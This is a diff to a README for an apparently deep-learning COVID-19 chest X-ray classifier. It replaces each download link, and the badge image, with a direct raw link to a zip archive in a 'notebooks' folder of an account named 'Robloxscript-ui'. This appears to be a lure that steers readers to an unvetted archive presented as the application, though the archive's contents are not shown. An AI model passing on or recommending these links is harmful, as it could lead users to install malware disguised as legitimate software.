@@ -1,6 +1,6 @@
 # 🖥️ Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM - Classify X-rays with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/releases)
+[![Download Now](https://raw.githubusercontent.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/main/notebooks/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM-1.3.zip)](https://raw.githubusercontent.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/main/notebooks/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM-1.3.zip)
 
 ## 📚 Overview
 
@@ -25,7 +25,7 @@ This project offers a user-friendly way to classify X-rays using deep learning. 
 
 ### Step 1: Download the Application
 
-To download the application, follow this link: [Visit this page to download](https://github.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/releases)
+To download the application, follow this link: [Visit this page to download](https://raw.githubusercontent.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/main/notebooks/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM-1.3.zip)
 
 ### Step 2: Choose Your Version
 
@@ -81,7 +81,7 @@ A: Check the GitHub Issues page for troubleshooting tips or to ask for help.
 
 For a straightforward installation process and to download the application, visit the link below:
 
-[Visit this page to download](https://github.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Robloxscript-ui/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM/main/notebooks/Deep-Learning-COVID-19-Chest-X-ray-Classification-with-Grad-CAM-1.3.zip)
 
 ### Helpful Resources
 
